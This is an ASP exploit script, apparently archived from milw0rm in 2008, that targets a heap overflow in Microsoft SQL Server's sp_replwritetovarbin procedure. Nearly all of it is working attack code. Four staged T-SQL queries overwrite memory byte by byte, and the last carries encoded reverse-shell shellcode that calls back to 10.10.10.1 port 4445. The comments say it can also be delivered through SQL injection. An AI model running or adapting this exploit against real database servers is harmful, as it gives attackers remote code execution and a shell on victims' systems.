<html><head><title>Microsoft SQL Server sp_replwritetovarbin() Heap Overflow Exploit</title></head><pre>&lt;html&gt;
&lt;%
// k`sOSe 12/17/2008
// Microsoft SQL Server &quot;sp_replwritetovarbin()&quot; Heap Overflow
// Tested on Win2k SP4 with MSSQL 2000(on one box only!).
// Shellcode is a slightly modified metasploit reverse shell(on 10.10.10.1 port 4445),
// the change allows multiple shots :)
// 
// You need a valid SQL account, but you can also use this through an SQL-Injection simply by injecting the T-SQL stuff.

// Take a look at the comments in T-SQL



On Error Resume Next

// change this
UserName = &quot;r00t&quot;
Password = &quot;t00r&quot;

// ########################################### FIRST QUERY
SQL = &quot;DECLARE @buf NVARCHAR(4000),				&quot;&amp;_
&quot;@val NVARCHAR(4),						&quot;&amp;_
&quot;@counter INT							&quot;&amp;_
&quot;SET @buf = '							&quot;&amp;_ 
&quot;declare @retcode int,						&quot;&amp;_
&quot;@end_offset int,						&quot;&amp;_
&quot;@vb_buffer varbinary,						&quot;&amp;_
&quot;@vb_bufferlen int						&quot;&amp;_  
&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;&amp;_
&quot;SET @val = CHAR(0x41)						&quot;&amp;_
&quot;SET @counter = 0						&quot;&amp;_
&quot;WHILE @counter &lt; 3020						&quot;&amp;_
&quot;BEGIN								&quot;&amp;_
&quot;  SET @counter = @counter + 1					&quot;&amp;_
&quot;  IF @counter = 2900						&quot;&amp;_	 
&quot;  BEGIN							&quot;&amp;_
&quot;    SET @val =  CHAR(0x43)					&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  ELSE IF @counter = 299					&quot;&amp;_
&quot;  BEGIN							&quot;&amp;_
&quot;    SET @val =  CHAR(0x42)					&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  ELSE IF @counter = 300					&quot;&amp;_
&quot;  BEGIN							&quot;&amp;_


&quot;     /* First byte overwritten here. This is a random writable address */	&quot;&amp;_
&quot;     SET @buf = @buf + CHAR(0x44) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;&amp;_
&quot;     CONTINUE							&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  SET @buf = @buf + @val					&quot;&amp;_
&quot;END								&quot;&amp;_
&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   &quot;&amp;_
&quot;EXEC master..sp_executesql @buf&quot;							





// ########################################### SECOND QUERY
SQL2 = &quot;DECLARE @buf NVARCHAR(4000),				&quot;&amp;_
&quot;@val NVARCHAR(4),						&quot;&amp;_
&quot;@counter INT							&quot;&amp;_
&quot;SET @buf = '							&quot;&amp;_ 
&quot;declare @retcode int,						&quot;&amp;_
&quot;@end_offset int,						&quot;&amp;_
&quot;@vb_buffer varbinary,						&quot;&amp;_
&quot;@vb_bufferlen int						&quot;&amp;_  
&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;&amp;_
&quot;SET @val = CHAR(0x41)						&quot;&amp;_
&quot;SET @counter = 0						&quot;&amp;_
&quot;WHILE @counter &lt; 3097						&quot;&amp;_
&quot;BEGIN								&quot;&amp;_
&quot;  SET @counter = @counter + 1					&quot;&amp;_
&quot;  IF @counter = 2900						&quot;&amp;_	 
&quot;  BEGIN							&quot;&amp;_
&quot;    SET @val =  CHAR(0x43)					&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  ELSE IF @counter = 299					&quot;&amp;_
&quot;  BEGIN							&quot;&amp;_
&quot;    SET @val =  CHAR(0x42)					&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  ELSE IF @counter = 300					&quot;&amp;_
&quot;  BEGIN							&quot;&amp;_


&quot;     /* Second byte overwritten here */			&quot;&amp;_
&quot;     SET @buf = @buf + CHAR(0x45) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;&amp;_
&quot;     CONTINUE							&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  SET @buf = @buf + @val					&quot;&amp;_
&quot;END								&quot;&amp;_
&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   &quot;&amp;_
&quot;EXEC master..sp_executesql @buf&quot;							





// ########################################### THIRD QUERY
SQL3 = &quot;DECLARE @buf NVARCHAR(4000),				&quot;&amp;_
&quot;@val NVARCHAR(4),						&quot;&amp;_
&quot;@counter INT							&quot;&amp;_
&quot;SET @buf = '							&quot;&amp;_ 
&quot;declare @retcode int,						&quot;&amp;_
&quot;@end_offset int,						&quot;&amp;_
&quot;@vb_buffer varbinary,						&quot;&amp;_
&quot;@vb_bufferlen int						&quot;&amp;_  
&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;&amp;_
&quot;SET @val = CHAR(0x41)						&quot;&amp;_
&quot;SET @counter = 0						&quot;&amp;_
&quot;WHILE @counter &lt; 3021						&quot;&amp;_
&quot;BEGIN								&quot;&amp;_
&quot;  SET @counter = @counter + 1					&quot;&amp;_
&quot;  IF @counter = 2900						&quot;&amp;_	 
&quot;  BEGIN							&quot;&amp;_
&quot;    SET @val =  CHAR(0x43)					&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  ELSE IF @counter = 299					&quot;&amp;_
&quot;  BEGIN							&quot;&amp;_
&quot;    SET @val =  CHAR(0x42)					&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  ELSE IF @counter = 300					&quot;&amp;_
&quot;  BEGIN							&quot;&amp;_


&quot;     /* Third byte overwritten here */				&quot;&amp;_
&quot;     SET @buf = @buf + CHAR(0x46) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;&amp;_
&quot;     CONTINUE							&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  SET @buf = @buf + @val					&quot;&amp;_
&quot;END								&quot;&amp;_
&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   &quot;&amp;_
&quot;EXEC master..sp_executesql @buf&quot;							





// ########################################### FOURTH QUERY
SQL4 = &quot;DECLARE @buf NVARCHAR(4000),				&quot;&amp;_
&quot;@val NVARCHAR(4),						&quot;&amp;_
&quot;@counter INT							&quot;&amp;_
&quot;SET @buf = '							&quot;&amp;_ 
&quot;declare @retcode int,						&quot;&amp;_
&quot;@end_offset int,						&quot;&amp;_
&quot;@vb_buffer varbinary,						&quot;&amp;_
&quot;@vb_bufferlen int						&quot;&amp;_  
&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;&amp;_
&quot;SET @val = CHAR(0x41)						&quot;&amp;_
&quot;SET @counter = 0						&quot;&amp;_
&quot;WHILE @counter &lt; 2708						&quot;&amp;_
&quot;BEGIN								&quot;&amp;_
&quot;  SET @counter = @counter + 1					&quot;&amp;_
&quot;  IF @counter = 2900						&quot;&amp;_	 
&quot;  BEGIN							&quot;&amp;_
&quot;    SET @val =  CHAR(0x43)					&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  IF @counter = 108						&quot;&amp;_
&quot;  BEGIN							&quot;&amp;_


&quot;     /* this is the pointer we wrote - 0x38. It points to a CALL ECX */	&quot;&amp;_
&quot;    SET @buf = @buf + CHAR(0x10) + CHAR(0xc0) + CHAR(0x4c) + CHAR(0x19) &quot;&amp;_


&quot;     /* realign code */						&quot;&amp;_
&quot;    SET @buf = @buf + CHAR(0xe1)				&quot;&amp;_


&quot;     /* realign the stack */					&quot;&amp;_
&quot;    SET @buf = @buf + CHAR(0x83) + CHAR(0xe4) + CHAR(0xfc)	&quot;&amp;_


&quot;     /* jump ahead */						&quot;&amp;_
&quot;    SET @buf = @buf + CHAR(0xe9) + CHAR(0xba) + CHAR(0x00) + CHAR(0x00) + CHAR(0x00) &quot;&amp;_
&quot;    SET @counter = @counter + 12				&quot;&amp;_
&quot;    CONTINUE							&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  ELSE IF @counter = 299					&quot;&amp;_
&quot;  BEGIN							&quot;&amp;_
&quot;    SET @val =  CHAR(0x42)					&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  ELSE IF @counter = 300					&quot;&amp;_
&quot;  BEGIN							&quot;&amp;_


&quot;     /* Fourth byte overwritten here */			&quot;&amp;_
&quot;     SET @buf = @buf + CHAR(0x47) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;&amp;_


&quot;     /* reverse shell on 10.10.10.1:4445 */			&quot;&amp;_
&quot;     SET @buf=@buf+CHAR(0xfc)+CHAR(0x6a)+CHAR(0xeb)+CHAR(0x4d)+CHAR(0xe8)+CHAR(0xf9)+CHAR(0xff)+CHAR(0xff)+CHAR(0xff)+CHAR(0x60)+CHAR(0x8b)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x24)+CHAR(0x8b)+CHAR(0x45)+CHAR(0x3c)+CHAR(0x8b)+CHAR(0x7c)+CHAR(0x05)+CHAR(0x78)+CHAR(0x01)+CHAR(0xef)+CHAR(0x8b)+CHAR(0x4f)+CHAR(0x18)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x20)+CHAR(0x01)+CHAR(0xeb)+CHAR(0x49)+CHAR(0x8b)+CHAR(0x34)+CHAR(0x8b)+CHAR(0x01)+CHAR(0xee)+CHAR(0x31)+CHAR(0xc0)+CHAR(0x99)+CHAR(0xac)+CHAR(0x84)+CHAR(0xc0)+CHAR(0x74)+CHAR(0x07)+CHAR(0xc1)+CHAR(0xca)+CHAR(0x0d)+CHAR(0x01)+CHAR(0xc2)+CHAR(0xeb)+CHAR(0xf4)+CHAR(0x3b)+CHAR(0x54)+CHAR(0x24)+CHAR(0x28)+CHAR(0x75)+CHAR(0xe5)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x24)+CHAR(0x01)+CHAR(0xeb)+CHAR(0x66)+CHAR(0x8b)+CHAR(0x0c)+CHAR(0x4b)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x1c)+CHAR(0x01)+CHAR(0xeb)+CHAR(0x03)+CHAR(0x2c)+CHAR(0x8b)+CHAR(0x89)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x1c)+CHAR(0x61)+CHAR(0xc3)+CHAR(0x31)+CHAR(0xdb)+CHAR(0x64)+CHAR(0x8b)+CHAR(0x43)+CHAR(0x30)+CHAR(0x8b)+CHAR(0x40)+CHAR(0x0c)+CHAR(0x8b)+CHAR(0x70)+CHAR(0x1c)+CHAR(0xad)+CHAR(0x8b)+CHAR(0x40)+CHAR(0x08)+CHAR(0x5e)+CHAR(0x68)+CHAR(0x8e)+CHAR(0x4e)+CHAR(0x0e)+CHAR(0xec)+CHAR(0x50)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x66)+CHAR(0x53)+CHAR(0x66)+CHAR(0x68)+CHAR(0x33)+CHAR(0x32)+CHAR(0x68)+CHAR(0x77)+CHAR(0x73)+CHAR(0x32)+CHAR(0x5f)+CHAR(0x54)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xcb)+CHAR(0xed)+CHAR(0xfc)+CHAR(0x3b)+CHAR(0x50)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x5f)+CHAR(0x89)+CHAR(0xe5)+CHAR(0x66)+CHAR(0x81)+CHAR(0xed)+CHAR(0x08)+CHAR(0x02)+CHAR(0x55)+CHAR(0x6a)+CHAR(0x02)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xd9)+CHAR(0x09)+CHAR(0xf5)+CHAR(0xad)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x53)+CHAR(0x53)+CHAR(0x53)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x01)+CHAR(0x66)+CHAR(0x68)+CHAR(0x11)+CHAR(0x5d)+CHAR(0x66)+CHAR(0x53)+CHAR(0x89)+CHAR(0xe1)+CHAR(0x95)+CHAR(0x68)+CHAR(0xec)+CHAR(0xf9)+CHAR(0xaa)+CHAR(0x60)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x6a)+CHAR(0x10)+CHAR(0x51)+CHAR(0x55)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x66)+CHAR(0x6a)+CHAR(0x64)+CHAR(0x66)+CHAR(0x68)+CHAR(0x63)+CHAR(0x6d)+CHAR(0x6a)+CHAR(0x50)+CHAR(0x59)+CHAR(0x29)+CHAR(0xcc)+CHAR(0x89)+CHAR(0xe7)+CHAR(0x6a)+CHAR(0x44)+CHAR(0x89)+CHAR(0xe2)+CHAR(0x31)+CHAR(0xc0)+CHAR(0xf3)+CHAR(0xaa)+CHAR(0x95)+CHAR(0x89)+CHAR(0xfd)+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2d)+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2c)+CHAR(0x8d)+CHAR(0x7a)+CHAR(0x38)+CHAR(0xab)+CHAR(0xab)+CHAR(0xab)+CHAR(0x68)+CHAR(0x72)+CHAR(0xfe)+CHAR(0xb3)+CHAR(0x16)+CHAR(0xff)+CHAR(0x75)+CHAR(0x28)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x5b)+CHAR(0x57)+CHAR(0x52)+CHAR(0x51)+CHAR(0x51)+CHAR(0x51)+CHAR(0x6a)+CHAR(0x01)+CHAR(0x51)+CHAR(0x51)+CHAR(0x55)+CHAR(0x51)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xad)+CHAR(0xd9)+CHAR(0x05)+CHAR(0xce)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x6a)+CHAR(0xff)+CHAR(0xff)+CHAR(0x37)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xe7)+CHAR(0x79)+CHAR(0xc6)+CHAR(0x79)+CHAR(0xff)+CHAR(0x75)+CHAR(0x04)+CHAR(0xff)+CHAR(0xd6)+CHAR(0xff)+CHAR(0x77)+CHAR(0xfc)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xef)+CHAR(0xce)+CHAR(0xe0)+CHAR(0x60)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd6)		&quot;&amp;_
&quot;     CONTINUE							&quot;&amp;_
&quot;  END								&quot;&amp;_
&quot;  SET @buf = @buf + @val					&quot;&amp;_
&quot;END								&quot;&amp;_
&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   &quot;&amp;_
&quot;EXEC master..sp_executesql @buf&quot;							


Set oConnection = Server.CreateObject(&quot;ADODB.Connection&quot;)
oConnection.Open &quot;Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=&quot; &amp; UserName &amp; &quot;; Password=&quot; &amp; Password
Set rs = Server.CreateObject(&quot;ADODB.Recordset&quot;)

phase = Request.Querystring(&quot;p&quot;)

if phase then
	if phase = 1 then
		rs.open SQL3, oConnection
		rs.close
		oConnection.Close
		Set oConnection = Nothing
		Response.Redirect(&quot;sql-exploit.asp?p=2&quot;)
	elseif phase = 2 then
		rs.open SQL4, oConnection
		rs.close
		oConnection.Close
		Set oConnection = Nothing
		Response.Redirect(&quot;sql-exploit.asp?p=3&quot;)
	end if
Else
	rs.open SQL, oConnection
	rs.close
	oConnection.Close
	Set oConnection = Nothing
	
	Set oConnection = Server.CreateObject(&quot;ADODB.Connection&quot;)
	oConnection.Open &quot;Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=&quot; &amp; UserName &amp; &quot;; Password=&quot; &amp; Password
	Set rs = Server.CreateObject(&quot;ADODB.Recordset&quot;)
	rs.open SQL2, oConnection
	rs.close
	oConnection.Close
	Set oConnection = Nothing	

	Response.Redirect(&quot;sql-exploit.asp?p=1&quot;)
end if


%&gt;


&lt;/html&gt;

# milw0rm.com [2008-12-17]</pre></html>